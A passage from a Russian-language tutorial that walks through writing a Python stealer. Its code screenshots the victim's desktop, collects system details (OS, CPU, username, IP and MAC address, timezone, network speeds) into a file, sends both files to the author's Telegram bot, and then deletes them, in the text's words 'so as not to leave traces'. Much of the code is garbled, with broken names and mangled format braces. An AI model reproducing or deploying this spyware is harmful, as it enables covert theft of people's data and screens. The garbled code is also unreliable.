Скриншот рабочего стола

os.getcwd()

try: #Перехват ошибки в случае неверно указанного расположения
	os.chdir(r"/tmp/path")
except OSError:
	@bot.message_handler(commands=['start'])
	def start_message(message): #Служебная обвязка для бота
		bot.send_message(message.chat.id, "[Error]: Location not found!")
		bot.stop_polling()
	
	bot.polling()
	raise SystemExit

screen = pyautogui.screenshot("screenshot.jpg") #Снятие скриншота

Тут все тоже максимально просто, а за собственно снятие скриншота отвечает только последняя
строка кода. Остальное мы используем для корректной обработки входящей команды бота.

Запись в файл

Теперь, когда все готово, мы можем приступать к финальному сбору и отправке данных.
Создаем готовый файл с нашими данными: если использовался максимальный сбор информации,
а точнее весь код выше, то используем такую запись, в противном случае убирай ненужные тебе
данные:
try: #Обвязка для обработки команд боту
	os.chdir(r"/tmp/path")
except OSrror:
	@bot.message_handler(commands=['start'])
	def start_message(message):
		bot.send_message(message.chat.id, "[Error]: Location not found!")
		bot.stop_polling() 
	bot.polling()
	raise SystemExt

file = open("info.txt", "w") #Открываем файл

file.write(f"[================================================]\n Operating System:
{ost.systeml\n Processor: {ost.processorl\n Username: {namej\n IP adress: {ipl\n
МАС adress: {macl\n Timezone: {time.yearl/{time.monthl/{time.day)
{time.hourj:{time.minutel:{time.secondl\n Work speed: {workspeedl\n Download:
{downloadl МВ/s\n Upload: {uploadsl МВ/s\n Мах Frequency: {cpu.max:.2fl Мhz\n Min
Frequency: {cpu.min:.2fl Mhz\n Current Frequency: {cpu.current: .2fl
Mhz\n[================================================]\n") # ПИшем
file.close() # Закрываем 

Длинный, но легко читаемый код. Первая его часть обеспечивает обработку команды /start,
вторая - запись всех данных в файл. Результат попадет в info.txt, но путь, конечно, можно
изменить прямо в коде.

Дело остается за малым - отправить результат в Telegram.

Отправка данных

Теперь дополним код выше, чтобы он еще и файлы отправлял.

text = "Screenshot" # Требуется при создании скриншота (текст к фото)

@bot.message_handler(commands=['start']) #Выполняет действия при команде start
def start_message(message):
	upfile = open("Path to file \info.txt", "rb") #Читает файлы
	uphoto = open("Path to file\screenshot.jpg", "rb")
	bot.send_photo(message.chat.id, uphoto, text) #Отправляет данные
	bot.send_document(message.chat.id, upfile)
	
	upfile.close() #Закрывает файлы (обязательно)
	uphoto.close()
	
	os.remove("info.txt") #Удаляет файлы, чтобы не оставлять следов
	os.remove("screenshot.jpg")
	
	bot.stop_polling() #Закрывает соединение после отправки
bot.polling() #Создает соединение с ботом

Сначала указывается подпись к скриншоту, потом читаем и отправляем файлы в виде фото и 
документа, затем защищаем следы и закрываем соединение с ботом. Ничего сложного!

Естественно, если нам не нужен, к примеру, скриншот, мы можем вырезатькод его отправки, получив
таакой вариант:

@bot.message_handler(commands=['start'])
def start_message(message):
	upfile = open("Path to file\info.txt", "rb")
	bot.send_document(message.chat.id, upfile)
	upfile.close()
	os.remove("info.txt")
	bot.stop_polling()
bot.polling()

Чтобы бот гарантированно отправлял все сообщения тебе, укажи вместо message.chat.id. 
ID чата с собой. ЕГо можно узнать через бот GetMyID (https://t.me/getmyid_bot)

Также следует учесть одну деталь: перед запуском программы ты должен отправить своему
боту команду /start, чтобы он понял, кому следует отправлять данные.
